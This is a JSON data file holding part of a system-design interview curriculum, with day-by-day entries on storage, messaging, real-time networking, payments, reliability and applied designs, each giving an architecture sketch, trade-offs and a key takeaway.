      "whatItIs": "Decomposing multi-gigabyte files into independent parallel chunks to maximize network bandwidth and provide resilient upload resumption.",
      "architecture": "MULTIPART UPLOAD PROTOCOL:\nClient ──1. InitiateMultipartUpload(bucket, key)──► Object Store (returns uploadID)\nClient splits 5GB file into parts (e.g. 50 × 100MB chunks)\nClient ──2. UploadPart(uploadID, partNumber, payload)──► Object Store (returns MD5/ETag)\n(Parts uploaded IN PARALLEL; failed parts retry independently without restarting!)\nClient ──3. CompleteMultipartUpload(uploadID, [(1,etag1), (2,etag2)...])──► Store reassembles!",
      "tradeoffs": [
        "Part Sizing Trade-offs: Small parts (5MB) mean cheaper retries but excessive HTTP metadata overhead; Large parts (1GB) risk wasting minutes of bandwidth on network drops. Sweet spot: 16–64MB",
        "Presigned URLs: Client uploads chunks directly to storage nodes, bypassing application web servers entirely and saving gigabytes of server bandwidth",
        "Abandoned Uploads Cost: Uncompleted multipart parts remain invisible in bucket listings but continue accruing storage billing; require S3 lifecycle rules to abort incomplete uploads after 7 days"
      ],
      "keyTakeaway": "Multipart upload turns one fragile, serial transfer into many small, parallel, retryable chunks. Add presigned URLs and lifecycle rules to reap abandoned parts."
    },
    {
      "id": "6.5",
      "tabTitle": "6.5 Design S3",
      "title": "6.5 Designing S3: The Data vs. Metadata Split",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "Architecting a planetary-scale object storage system by separating the immutable data plane from the strongly consistent metadata plane.",
      "architecture": "DATA / METADATA ARCHITECTURAL SEPARATION:\nClient ──HTTP PUT──► API Gateway ──► Auth & Rate Limit\n                      │\n         ┌────────────┴────────────┐\n         ▼ payload                 ▼ metadata\n  [DATA PLANE]              [METADATA PLANE]\n  Immutable Blobs by UUID   Mutable small records\n  Reed-Solomon Erasure      Sharded CockroachDB/Spanner\n  Dense HDDs / NVMe         Strongly consistent, indexed for LIST\n  Scales by CAPACITY        Scales by REQUEST RATE (QPS)",
      "tradeoffs": [
        "Why Separate Systems: Data is huge, immutable, and throughput-oriented; Metadata is tiny, mutable, queried at 100K+ QPS, and consistency-critical",
        "Partial Failure Recovery: Write data blob first, commit metadata second. If metadata write fails, garbage collector reaps orphaned data blob safely without dangling pointers",
        "Prefix Listing Scalability: S3 object listings are prefix range scans; shard metadata by bucket ID and maintain lexicographical key order"
      ],
      "keyTakeaway": "Design S3 as two systems with one API: an immutable erasure-coded data plane sized by capacity, and a mutable strongly-consistent metadata plane sized by request rate."
    }
  ],
  "31": [
    {
      "id": "7.1-kafka",
      "tabTitle": "7.1 Delivery Guarantees",
      "title": "7.1 Messaging Delivery Semantics & Outbox",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Guaranteeing message durability and exactly-once processing effects across distributed broker architectures.",
      "architecture": "TRANSACTIONAL OUTBOX PATTERN:\nApplication Service DB Transaction:\n  BEGIN;\n    INSERT INTO orders (id, user_id, amount) VALUES (...);\n    INSERT INTO outbox_events (event_id, payload) VALUES (...);\n  COMMIT; -- Both commit atomically or neither!\nCDC Relay (Debezium) reads outbox table commit log → streams to Kafka with zero message loss!",
      "tradeoffs": [
        "At-Least Once + Deduplication: The robust standard for distributed streaming; consumers enforce idempotency via unique constraints",
        "Poison Messages: Malformed payloads that crash consumer threads must be routed to a Dead-Letter Queue (DLQ) with backoff alerting to avoid blocking partition progress"
      ],
      "keyTakeaway": "Never publish an event directly before or after committing to a database: network failure will create inconsistencies. Use the Transactional Outbox pattern."
    },
    {
      "id": "7.2-internals",
      "tabTitle": "7.2 Kafka Internals",
      "title": "7.2 Kafka Broker & Consumer Group Internals",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Partitioning, sequential log segments, consumer offset commits, and rebalancing protocols in Apache Kafka.",
      "architecture": "PARTITION & CONSUMER GROUP MODEL:\nTopic [Orders] ── 4 Partitions:\n[Partition 0] ──► Consumer 1\n[Partition 1] ──► Consumer 2  } Consumer Group A (Independent offsets)\n[Partition 2] ──► Consumer 3\n[Partition 3] ──► Consumer 4\nOrdering is guaranteed strictly within a partition. Horizontal scaling is capped by partition count!",
      "tradeoffs": [
        "Kafka (Dumb broker, smart consumer: consumers track their own offsets, enabling message replay and multi-tenant fanout) vs. RabbitMQ (Smart broker: tracks per-message ACK/delete)",
        "Scaling a Lagging Consumer: Add partitions and consumers; batch downstream database writes; ensure partition key does not concentrate hot keys"
      ],
      "keyTakeaway": "Kafka scales throughput horizontally by adding partitions. Ordering is strictly per-partition. Design the partition key around the entity that requires sequencing."
    }
  ],
  "32": [
    {
      "id": "2.7-push",
      "tabTitle": "2.7 Push Channels",
      "title": "2.7 Server-to-Client Push: Polling, SSE, WebSockets",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Evaluating the trade-offs between client polling, Server-Sent Events (SSE), and bidirectional WebSockets for live notifications.",
      "architecture": "PUSH PROTOCOLS COMPARED:\n• Short Polling: Client sends HTTP request every N seconds (Wasteful, high server load)\n• Long Polling: Server holds connection open until event occurs, then responds (Near real-time, connection churn)\n• Server-Sent Events (SSE): HTTP text/event-stream; persistent unidirectional push with auto-reconnect and Last-Event-ID (Simple, HTTP/2 friendly)\n• WebSockets: Full-duplex bidirectional TCP socket; lowest latency (Stateful, requires dedicated connection tier)",
      "tradeoffs": [
        "Unidirectional Updates (Notifications, stock ticker: SSE gets you 90% of the value for 20% of the operational complexity)",
        "Stateful Scaling Trap: 1M WebSockets requires connection-aware load balancers, heartbeat ping/pong, and a Redis Pub/Sub cross-server routing backplane"
      ],
      "keyTakeaway": "Pick the weakest mechanism that meets the latency requirement: polling < long polling < SSE < WebSocket. Use SSE for one-way feeds and WebSockets for interactive chat."
    },
    {
      "id": "13.5",
      "tabTitle": "13.5 Webhooks Outbound",
      "title": "13.5 Webhooks and Outbound Integrations",
      "section": "Part 13 · Architecture & Integration",
      "whatItIs": "Delivering event payloads to untrusted third-party customer HTTP endpoints reliably and securely without starvation.",
      "architecture": "WEBHOOK DELIVERY PIPELINE:\nEvent Outbox ──► Partition by Tenant ──► Delivery Queue ──► Worker Pool ──► Customer URL\n• Per-Tenant Queues: A slow customer endpoint (taking 30s) only blocks their own worker queue, avoiding head-of-line blocking for others!\n• Exponential Retry: Immediately → +10s → +1m → +5m → +30m → +2h → +12h → +24h (then disable endpoint & alert)\n• Security: Sign payload using HMAC-SHA256(secret, timestamp + '.' + body); customer verifies signature in constant time.",
      "tradeoffs": [
        "SSRF Defense: Customer webhook URLs are attacker-controlled; validate and resolve IP, reject loopback (127.0.0.1) and link-local cloud metadata IPs (169.254.169.254)",
        "Per-Endpoint Circuit Breakers: Trip breaker after consecutive failures to park events and protect your worker thread pool"
      ],
      "keyTakeaway": "Webhooks make you the unreliable caller. Partition queues by tenant so slow customers only hurt themselves. Sign payloads with HMAC and treat URLs as SSRF risks."
    }
  ],
  "33": [
    {
      "id": "11.5",
      "tabTitle": "11.5 Long-Lived Conns",
      "title": "11.5 Scaling Long-Lived Connections (C10M)",
      "section": "Part 11 · Networking",
      "whatItIs": "Maintaining millions of concurrent stateful WebSocket connections with Linux kernel tuning and connection backplanes.",
      "architecture": "1 MILLION CONCURRENT WEBSOCKETS CAPACITY MATH:\n• Memory per connection: ~10 KB kernel socket buffer + ~4 KB application state $\\approx$ 14 KB\n• Memory per node (50K conns): 50,000 × 14 KB $\\approx$ 700 MB RAM (Very comfortable!)\n• Cluster Sizing: 1M / 50K = 20 nodes → Run 30 nodes across 3 AZs for N+1 redundancy\n• Reconnect Storm: 1M reconnects simultaneously = 1M TLS handshakes! Jitter backoff over 5 mins (1M / 300s = ~3,300 handshakes/sec)",
      "tradeoffs": [
        "Linux OS Limits: Raise `ulimit -n` file descriptors; allocate multiple source IPs on load balancer to avoid 28K ephemeral port exhaustion per IP pair",
        "Connection Churn: Enforce max connection lifetime with jitter (e.g. 45 ± 15 mins) to continuously reshuffle connections and avoid post-deploy load imbalances"
      ],
      "keyTakeaway": "Long-lived connections turn a stateless tier into a sticky, memory-bound one. Scale on connection count and memory, not CPU. Design for the deploy and the reconnect storm."
    },
    {
      "id": "11.6-chat",
      "tabTitle": "11.6 WebRTC & SFU",
      "title": "11.6 Selective Forwarding Units (SFU) for Audio/Video",
      "section": "Part 11 · Networking",
      "whatItIs": "Architecting real-time group voice and video channels using Selective Forwarding Units without expensive transcoding.",
      "architecture": "SFU FORWARDING ARCHITECTURE:\nPeer A (Speaker) ──publish 1 stream (Simulcast: 1080p, 720p, 360p)──► SFU Server\n                                                                          │\n       ┌──────────────────────────────────────────────────────────────────┴──────────────────┐\n       ▼ (Desktop, fast link)                                                                ▼ (Mobile, lossy link)\nForward 1080p stream                                                                  Forward 360p stream",
      "tradeoffs": [
        "SFU vs. Mesh P2P: P2P requires $N-1$ uplinks per client; collapses at 5+ users. SFU requires only 1 uplink per client and scales to hundreds of participants",
        "Simulcast: The magic that makes SFUs work without CPU transcoding — sender publishes multiple bitrates; SFU forwards appropriate stream based on receiver downlink"
      ],
      "keyTakeaway": "SFUs are bandwidth-heavy and CPU-light. Route rooms to SFU nodes using consistent hashing and use simulcast to accommodate diverse client network conditions."
    }
  ],
  "34": [
    {
      "id": "13.1",
      "tabTitle": "13.1 Event Sourcing",
      "title": "13.1 Event Sourcing and CQRS",
      "section": "Part 13 · Architecture & Integration",
      "whatItIs": "Storing the immutable append-only log of domain events as the source of truth, deriving current application state by replaying history.",
      "architecture": "COMMAND IN, EVENTS STORED, PROJECTIONS OUT:\nCommand ('Edit Doc') ──► Aggregate validates ──► Emits Event ('CharInserted')\n                                                       │\n                                                       ▼\n                          [EVENT STORE: Append-only, Immutable Log]\n                                                       │\n        ┌──────────────────────────────┬───────────────┴──────────────────────────────┐\n        ▼                              ▼                                              ▼\n[Document Projection]          [Search Inverted Index]                    [Analytics Warehouse]\nCurrent text state             Full-text index                            Columnar ClickHouse",
      "tradeoffs": [
        "Event Sourcing vs. CQRS: Event Sourcing is about storage (keep events, derive state); CQRS is about separation (different models for reading and writing)",
        "Snapshots: Every N events (e.g. 500 events), persist a state snapshot so rebuilding an entity reads the snapshot plus short tail rather than 100K historical events",
        "Schema Evolution: Never edit historical stored events; use upcasting functions to transform v1 event schemas into v2 on-the-fly during read replay"
      ],
      "keyTakeaway": "Event sourcing is for domains where history is the product: ledgers, audit trails, collaborative docs. Projections lag writes; use read-your-writes version tokens."
    },
    {
      "id": "10.2-time",
      "tabTitle": "10.2 Vector Clocks",
      "title": "10.2 Vector Clocks & Concurrent Edit Merging",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Tracking causality and detecting concurrent multi-user edits in collaborative systems without a centralized lock.",
      "architecture": "VECTOR CLOCK COMPARISON:\nClient A: writes 'Hello' → Vector {A:1, B:0}\nClient B: writes 'World' → Vector {A:0, B:1}\nMerge comparison: Neither vector dominates → TRUE CONCURRENCY DETECTED!\nSystem retains both siblings and triggers operational transformation or CRDT merge algorithms to resolve without silent data overwrites.",
      "tradeoffs": [
        "Operational Transformation (OT: central server transforms index positions, used by Google Docs) vs. CRDTs (convergent peer-to-peer data types, used by Figma)",
        "Vector Clock Pruning: Prune old vector clock entries using causal stability watermarks to prevent unbounded metadata growth"
      ],
      "keyTakeaway": "Wall-clock timestamps silently lose concurrent edits. Vector clocks preserve concurrency information so applications can merge concurrent edits safely."
    }
  ],
  "35": [
    {
      "id": "rev-5",
      "tabTitle": "Whiteboard Mocks",
      "title": "Revision Day 5 · Storage, Messaging & Real-Time Whiteboard Drills",
      "section": "Week 5 Review & Applied Drills",
      "whatItIs": "Timed whiteboard scenarios for Week 5 architectures: DynamoDB, S3, Kafka, Notification Service, WhatsApp, and Collaborative Docs.",
      "architecture": "WEEK 5 DRILL TARGETS:\n• WhatsApp: Design 45-min real-time messaging architecture; diagram message status state machine (Sent → Delivered → Read)\n• S3: Walk through multipart upload failure recovery and 4+2 erasure coding parity reconstruction\n• DynamoDB: Calculate tunable quorum trade-offs ($R+W > N$); explain anti-entropy Merkle tree sync\n• Collaborative Docs: Defend Operational Transformation (OT) vs. CRDTs under poor mobile network conditions",
      "tradeoffs": [
        "Stateful vs. Stateless: Explaining how to manage connection state across gateway fleets with Redis pub/sub backplanes",
        "Failure Modes: Explaining how a Kafka consumer handles poison pills and consumer group rebalances"
      ],
      "keyTakeaway": "Practice drawing system boundaries clearly: separate data planes from metadata planes, and command paths from projection paths."
    },
    {
      "id": "rev-5-patterns",
      "tabTitle": "C.3 Pattern Index",
      "title": "Appendix C.3 Problem-to-Pattern Index",
      "section": "Week 5 Review & Applied Drills",
      "whatItIs": "Flash-recall association drill mapping common interview prompt phrases directly to standard battle-tested architecture patterns.",
      "architecture": "PROMPT PHRASE → PATTERN MAPPING:\n• 'Read-heavy, same data repeatedly' → Cache-Aside + TTL Jitter (5.1) + CDN (2.5)\n• 'Write-heavy, append-only' → LSM-Tree engine (4.9) + Kafka buffer (7.2)\n• 'Needs to be exactly once' → At-least-once + Idempotency key unique constraint (13.2)\n• 'Spiky 100× peak' → Queue buffer + admission control (9.6); pre-scale, don't autoscale\n• 'Must not lose data' → Synchronous quorum replication, RPO=0 (4.4) + double-entry ledger\n• 'Millions of concurrent connections' → Event loop + connection scaling + pub/sub backplane (11.5)\n• 'Find things near me' → Geohash / S2 / H3 + 8 neighbor cells (9.1)\n• 'Does this exist? at huge scale' → Bloom filter (5.5)",
      "tradeoffs": [
        "Reflexive Recall: Drilling the pattern index allows candidates to name the correct architecture in under 30 seconds"
      ],
      "keyTakeaway": "Match problem characteristics directly to architectural patterns. State the pattern and immediately name its primary operational trade-off."
    }
  ],
  "36": [
    {
      "id": "8.4",
      "tabTitle": "8.4 Outage War Story",
      "title": "8.4 War Story: Handling a 10-Hour Large-Scale Outage",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "Deconstructing Discord's real-world catastrophic outage where an administrative cloud control-plane bug terminated the entire production server fleet.",
      "architecture": "WHAT HAPPENED (DISCORD INCIDENT):\nFriday 9 PM: Routine request to terminate an unused Memcache pool.\nVendor cloud management software confirmation dialog showed 1 node, but underlying code terminated EVERYTHING.\nEvery HAProxy, web server, MySQL DB, and cache node terminated simultaneously for 30M DAU service!\nTook 50 engineers 10 hours to rebuild from scratch.",
      "tradeoffs": [
        "Control Plane Blast Radius: Control-plane tools are more dangerous than application code; require declarative diffable infrastructure (Terraform/GitOps)",
        "Confirmation Dialogs are NOT a Safety Mechanism: Real safeguards are IAM authorization limits, termination protection, and two-person rule approvals",
        "Recovery Time is a Design Property: Untested disaster recovery runbooks mean recovery takes hours; require regular game days and automated rebuild scripts"
      ],
      "keyTakeaway": "Your control plane is part of your attack and failure surface. Blast-radius limits, declarative infrastructure, and rehearsed restores are the answer — confirmation dialogs are not."
    },
    {
      "id": "12.5",
      "tabTitle": "12.5 Little's Law & Sizing",
      "title": "12.5 Capacity Planning & Autoscaling Traps",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Using Little's Law to calculate concurrent connection capacity and avoiding common automated autoscaling collapse traps.",
      "architecture": "LITTLE'S LAW FORMULA:\nConcurrency in flight $L = \\lambda \\times W$ (Arrival Rate $\\lambda$ × Service Time $W$)\n• Example: 5,000 requests/sec at 200ms average latency → $L = 5,000 \\times 0.2 = 1,000$ concurrent requests\n• The Queue Collapse Trap: Under load, latency doubles to 400ms → required concurrency doubles to 2,000!\nMore threads block on DB connections → DB melts → total cascade!",
      "tradeoffs": [
        "Autoscaling Traps: Scaling out opens more DB connections, exhausting DB pool; VM cold start takes 2 mins while traffic spikes in 10s (Pre-scale instead!)",
        "Headroom Sizing (The N+1 Rule): In a 3-AZ deployment, size each AZ to run at $\\le 66\\%$ capacity so two AZs can absorb the loss of the third without degradation"
      ],
      "keyTakeaway": "Use Little's Law to size concurrency. Scale on queue depth or in-flight concurrency, not CPU. Autoscaling cannot beat a fast spike — that is what pre-scaling is for."
    }
  ],
  "37": [
    {
      "id": "9.1",
      "tabTitle": "9.1 Geohash vs Quadtree",
      "title": "9.1 Proximity Search: Geohash and Quadtree",
      "section": "Part 9 · Applied System Designs",
      "whatItIs": "Algorithms for indexing two-dimensional geographic space (latitude/longitude) to query nearby businesses within milliseconds.",
      "architecture": "GEOHASH (2D TO 1D SORTABLE STRING):\nRecursive quadrant subdivision, interleaving longitude and latitude bits.\n• 1 char $\\approx$ 5,000 km | 5 chars $\\approx$ 5 km | 6 chars $\\approx$ 1.2 km | 7 chars $\\approx$ 150 m\nProximity search becomes a STRING PREFIX SCAN on a standard B-Tree index: `WHERE geohash LIKE '9q8zn%'`!\nQUADTREE: In-memory tree where nodes split into 4 quadrants when count > 100 businesses. Adapts depth to density (ocean = 1 huge node; downtown = dense deep leaves).",
      "tradeoffs": [
        "The Geohash Boundary Problem: Adjacent locations across cell boundaries share no prefix; must query target cell PLUS its 8 neighboring cells in parallel",
        "The 1.71 GB RAM Estimate: The entire world's business quadtree/geohash index fits in ~1.71 GB RAM on ONE modern server! Proves sharding is unnecessary; use read replicas"
      ],
      "keyTakeaway": "Proximity search reduces 2D space to a 1D ordered key so an ordinary index can do the work. Quote the 1.71 GB estimate — it proves you optimize for operability over resume keywords."
    },
    {
      "id": "9.2",
      "tabTitle": "9.2 Google Maps Internals",
      "title": "9.2 Google Maps Architecture: Tiling & Route Planning",
      "section": "Part 9 · Applied System Designs",
      "whatItIs": "Decomposing map platforms into pre-computed tile pyramids, real-time probe stream ingestion, and hierarchical routing graphs.",
      "architecture": "THREE ARCHITECTURAL SHAPES:\n1. Rendering (Caching Problem): World broken into 256×256px pre-computed tiles across 21 zoom levels (4^z tiles). Client fetches viewport tiles from CDN edge!\n2. Location Ingestion (Write Problem): 1B DAU sending GPS probes every 4s = 10^6 writes/sec. Aggregated at edge into Kafka streams; never written raw to DB!\n3. Route Planning (Graph Compute): Road network divided into road segments and super segments. Shortest path via precomputed Contraction Hierarchies + A*.",
      "tradeoffs": [
        "Pre-computed Vector Tiles vs. Raster: Vector tiles send geometry rendered on client GPU, shrinking bandwidth and enabling crisp rotation",
        "Dynamic ETA Computation: Static road topology combined with live traffic speed feeds from streaming probe logs"
      ],
      "keyTakeaway": "Google Maps decomposes into three different shapes: rendering is caching (tiles + CDN), navigation is graph compute (hierarchy + A*), and location is write throughput (stream aggregation)."
    }
  ],
  "38": [
    {
      "id": "12.1",
      "tabTitle": "12.1 Distributed Tracing",
      "title": "12.1 Distributed Tracing & Context Propagation",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Stitching causally linked timed spans emitted by dozens of microservices into an end-to-end request latency waterfall.",
      "architecture": "TRACE WATERFALL MODEL:\nTrace 7f3a... total 840 ms\n ├─ api-gateway [ 840 ms ]\n │   ├─ auth-service [ 45 ms ]\n │   └─ order-service [ 680 ms ]\n │       └─ inventory-service [ 580 ms ]\n │           └─ 6 × SELECT stock [ 6 × 95 ms ] ◄── N+1 sequential loop!\nTraces instantly reveal that inventory-service has an N+1 query loop, which dashboard averages hid!",
      "tradeoffs": [
        "Context Propagation: Passing W3C `traceparent` header across process and queue boundaries is the single most common implementation bug",
        "Head-Based Sampling (Decide at start; 1% sample rate misses rare errors) vs. Tail-Based Sampling (Buffer all spans in collector; retain 100% of errors and SLO violations)",
        "Logging vs. Tracing vs. Metrics: Metrics alert that something is wrong; traces show WHERE in the call graph time went; logs explain WHAT happened"
      ],
      "keyTakeaway": "Tracing answers 'where did the time go across services?' — the one question metrics and logs cannot answer. Always carry trace ID in every log line."
    },
    {
      "id": "12.2",
      "tabTitle": "12.2 Logging Pipelines",
      "title": "12.2 Logging Pipeline Design & Cost Control",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Ingesting, buffering, parsing, and storing terabytes of application logs daily without letting logging outages impact customer availability.",
      "architecture": "PIPELINE & BUFFERS:\nApp ──► Local Daemon Agent ──► Kafka Buffer ──► Log Processor ──► Hot Index (OpenSearch: 7 days)\n                                                                │\n                                                                └─► S3 Cold Archive (Months, Parquet)\nApp NEVER blocks on logging: uses bounded in-memory queue, dropping oldest lines if saturated!",
      "tradeoffs": [
        "Log Volume Arithmetic: 10,000 RPS × 5 lines/req × 500B = 25 MB/s = ~2.16 TB/day raw = ~97 TB hot retention with indexing overhead",
        "Cost Levers: Index only fields filtered in queries; delete health-check noise; sample high-volume 200 OK access logs; structure as JSON"
      ],
      "keyTakeaway": "Decouple logging via Kafka buffers so index outages never degrade application availability. Log decisions, not narration, and carry the trace ID everywhere."
    }
  ],
  "39": [
    {
      "id": "7.3",
      "tabTitle": "7.3 Orchestration vs Choreography",
      "title": "7.3 Microservice Collaboration Styles",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Comparing centralized workflow orchestrators against decentralized event-driven choreography for coordinating distributed microservices.",
      "architecture": "TWO COORDINATION STYLES:\n• Orchestration (Central Authority): Orchestrator (Temporal/Conductor) sends explicit command to Payment → Inventory → Shipping. Flow is visible in one place; orchestrator state must be HA.\n• Choreography (Event-Driven): Services publish domain events to shared Kafka bus; services react independently. Loose coupling, but no single place shows the full flow.\nHYBRID REALITY: Orchestrate the transactional core (payment, reservation); choreograph the reactive tail (emails, search indexing, analytics)!",
      "tradeoffs": [
        "Debuggability in Choreography: When a choreographed flow stops halfway, tracking down why requires distributed tracing and correlation IDs",
        "Schema Coupling in Choreography: Changes to event schemas break unknown downstream consumers; requires Schema Registries (Protobuf/Avro) with backward compatibility"
      ],
      "keyTakeaway": "Orchestrate what must be correct, ordered, and observable; choreograph what must be decoupled, reactive, and extensible. Real architectures mix both."
    },
    {
      "id": "13.4",
      "tabTitle": "13.4 Strangler Fig",
      "title": "13.4 Service Decomposition and the Strangler Fig",
      "section": "Part 13 · Architecture & Integration",
      "whatItIs": "Incrementally migrating capabilities out of a monolith into microservices without risky full-system rewrites.",
      "architecture": "THE 4 PHASES OF THE STRANGLER FIG:\nPhase 1: Insert API Gateway facade in front of monolith (change nothing behind it)\nPhase 2: Extract new microservice; dual-read to verify matching outputs with monolith\nPhase 3: Flip the WRITER to new service behind feature flag (Exactly ONE writer per dataset!)\nPhase 4: Monolith reads via API/events; repeat for next capability until monolith shrinks to zero.",
      "tradeoffs": [
        "The Distributed Monolith Trap: Services that cannot be deployed independently create the operational headaches of microservices with the coupling of monoliths",
        "Single Writer Rule: Never dual-write to two independent datastores simultaneously (no distributed transaction; they WILL diverge). Use CDC or outbox to migrate data"
      ],
      "keyTakeaway": "Draw boundaries from data ownership and change coupling, not nouns. Migrate with a strangler facade, one slice at a time, always with exactly ONE writer per dataset."
    }
  ],
  "40": [
    {
      "id": "9.4",
      "tabTitle": "9.4 Payment Architecture",
      "title": "9.4 Payment Systems: Clearing, Settlement & Ledgers",
      "section": "Part 9 · Applied System Designs",
      "whatItIs": "Architecting monetary transaction pipelines with asynchronous clearing/settlement, double-entry ledgers, and automated reconciliation.",
      "architecture": "INFORMATION FLOW VS. FUND FLOW:\n• Transaction Layer: User clicks Buy → Payment Executor authorizes card via PSP (real-time-ish info flow)\n• Clearing & Settlement: Banks net balances at end-of-day; actual money moves between reserve accounts at midnight (asynchronous fund flow!)\n• The Reconciliation Loop: Compares internal purchase orders, PSP statement files, and bank records to detect breaks automatically.",
      "tradeoffs": [
        "Wallet vs. Ledger: Wallet holds current balance (mutable read model); Ledger records immutable double-entry debits/credits (`sum(debits) == sum(credits)` must always balance)",
        "ID-Chaining: `order_id` → `psp_txn_id` → `payout_batch_id` → `invoice_id`. Every hop must carry upstream IDs so settlement records can be reconciled later"
      ],
      "keyTakeaway": "A payment system is an idempotent, append-only, reconcilable pipeline across untrusted boundaries. Ledger is source of truth; wallet is a derived projection."
    },
    {
      "id": "13.2-pay",
      "tabTitle": "13.2 Idempotency Keys",
      "title": "13.2 Idempotency Keys & Avoiding Double Charges",
      "section": "Part 13 · Architecture & Integration",
      "whatItIs": "Eliminating duplicate credit card payments during network timeouts using client-generated idempotency tokens and atomic database state machines.",
      "architecture": "IDEMPOTENCY STATE MACHINE:\nRequest arrives with Idempotency-Key: '7f3a...'\n  │\n  ▼ ATOMIC INSERT (key, state='IN_PROGRESS')\n  ├─ Insert Succeeds → Call PSP → Store Response, state='COMPLETED' → Return 200\n  ├─ Conflict (state='COMPLETED') → Return CACHED response (No re-charge!)\n  └─ Conflict (state='IN_PROGRESS') → Return 409 Conflict (Concurrent duplicate in flight)",
      "tradeoffs": [
        "Why 'Insert is the Lock': Two identical requests arriving at same millisecond both pass a 'check-then-act' query; an atomic unique constraint insert serializes the race",
        "Payload Binding: Hash request body with key; if same key arrives with different amount, reject with 422 to catch client bugs",
        "Downstream Propagation: Idempotency keys must be forwarded to external PSPs (Stripe) so network retries to payment gateways do not double charge"
      ],
      "keyTakeaway": "Exactly-Once = At-Least Once (retries) + At-Most Once (idempotency check). The unique index insert is the lock. Store and replay the original response."
    }
  ],
  "41": [
    {
      "id": "9.6",
      "tabTitle": "9.6 Flash Sale Funnel",
      "title": "9.6 Flash Sale Systems: Funnel Architecture",
      "section": "Part 9 · Applied System Designs",
      "whatItIs": "Absorbing extreme traffic surges (10M clicks in 1 second) while strictly guaranteeing zero inventory overselling.",
      "architecture": "THE 7-STAGE FUNNEL ARCHITECTURE:\n10M Users Click at 12:00:00\n  │\n  ▼ 1. Static Assets on CDN (Zero origin server traffic)\n  ▼ 2. Client-side Throttle (Button disabled after 1 click, CAPTCHA)\n  ▼ 3. Edge Rate Limiter (Token bucket per IP/device drops 90% traffic)\n  ▼ 4. Admission Control Gate (Only admit ~10× inventory through)\n  ▼ 5. Atomic Inventory Decrement in Redis (`DECR stock`; if < 0 reject immediately)\n  ▼ 6. Winning Requests Enqueued to Kafka\n  ▼ 7. DB Workers Drain Queue at safe rate to create orders and charge payment!",
      "tradeoffs": [
        "Preventing Overselling: Atomic Redis Lua decrement is the authority; database constraint `CHECK (stock >= 0)` is the unbypassable backstop",
        "Inventory Reservation: Hold stock with a 15-minute TTL; if user fails payment, saga compensation returns stock to waitlist pool automatically",
        "Isolation: Separate the flash sale service, cache, and DB from normal store traffic so flash spikes do not take down standard purchases (Bulkheads)"
      ],
      "keyTakeaway": "A flash sale is a load-shedding funnel: shed orders of magnitude at every layer. Decide inventory with one atomic operation, then process orders asynchronously."
    },
    {
      "id": "13.3",
      "tabTitle": "13.3 Durable Execution",
      "title": "13.3 Workflow Orchestration & Durable Execution",
      "section": "Part 13 · Architecture & Integration",
      "whatItIs": "Writing fault-tolerant long-running multi-step business sagas as standard code using durable execution engines (Temporal/Cadence).",
      "architecture": "DURABLE CODE EXECUTION:\ndef checkout_workflow(order):\n  payment = call_activity(charge_card, order)   # Journaled; retried on failure\n  try:\n    call_activity(reserve_inventory, order)     # Survives process crashes!\n  except Unavailable:\n    call_activity(refund_payment, payment)      # Durable compensation\n  sleep(days = 30)                              # Real timer; server can restart 100×",
      "tradeoffs": [
        "Hand-rolled Sagas (Status columns + cron jobs + retry tables: reinvented badly by every team) vs. Durable Execution engines",
        "Determinism Constraint: Workflow orchestration code must be purely deterministic; random numbers, wall clocks, and direct network I/O belong inside Activities"
      ],
      "keyTakeaway": "Durable execution products turn complex multi-day sagas into straightforward code. The engine journals every call and replays history to rebuild state after crashes."
    }
  ],
  "42": [
    {
      "id": "capstone-rubric",
      "tabTitle": "Staff Rubric",
      "title": "Staff & Principal 45-Minute Interview Rubric",
      "section": "Capstone Simulation & Final Mastery",
      "whatItIs": "The exact evaluation criteria used by FAANG/tier-1 tech companies to calibrate senior and staff software engineering design loops.",
      "architecture": "THE SENIOR / STAFF DIFFERENTIATION SIGNALS:\n• Requirements: Mid-level starts designing immediately; Senior pins down scale, consistency, and latency targets first\n• Technology Choice: Mid-level recites buzzwords; Senior derives choices from query access patterns and operational cost\n• Trade-offs: Mid-level lists pros/cons; Senior quantifies: '50% storage overhead vs. 200% for 3× replication'\n• Failure Handling: Mid-level says 'add a replica'; Senior explains split-brain, fencing tokens, and read-after-write repair\n• Ownership: Mid-level designs happy path; Senior covers rollout, canary baking, data migration, and on-call blast radius",
      "tradeoffs": [
        "Narrating Uncertainty: 'I don't know tool X's internals, but the property I need is Y' scores higher than a confident wrong claim",
        "Numbers Before Boxes: Always do back-of-the-envelope estimation to prove whether a distributed solution is even required"
      ],
      "keyTakeaway": "Interviews are a judgement test, not a recall test. For every design you propose: know what it costs, what it breaks, what you would monitor, and how to recover."
    },
    {
      "id": "rapid-257",
      "tabTitle": "257 Questions",
      "title": "Appendix D: 257-Question Rapid-Fire Final Drill",
      "section": "Capstone Simulation & Final Mastery",
      "whatItIs": "Comprehensive 257-question self-test covering all 14 parts of the guide: foundations, protocols, databases, storage, messaging, resilience, and applied designs.",
      "architecture": "THE 60-SECOND DRILL RULE:\nRead any question at random from the 257 bank:\n• If you cannot formulate a complete, concise 60-second verbal answer with trade-offs out loud, immediately review the referenced section.\nHigh-Yield Categories:\n1. Questions 1–30: Protocols, TCP/UDP, TLS 1.3, DNS, CDNs, Load Balancing\n2. Questions 31–70: ACID, MVCC, Sharding, Consistent Hashing, Storage Engines, Caching\n3. Questions 71–120: Kafka, Sagas, Consensus, Failure Detection, Outbox\n4. Questions 121–257: Applied Systems (TinyURL, S3, Maps, WhatsApp, Payments, Flash Sales)",
      "tradeoffs": [
        "Active Verbal Practice vs. Passive Reading: Speaking answers out loud builds conversational fluency under pressure"
      ],
      "keyTakeaway": "Congratulations on completing the 42-day curriculum. Trust the framework, do the math, name the trade-offs, and defend your boundaries."
    }
  ]
};
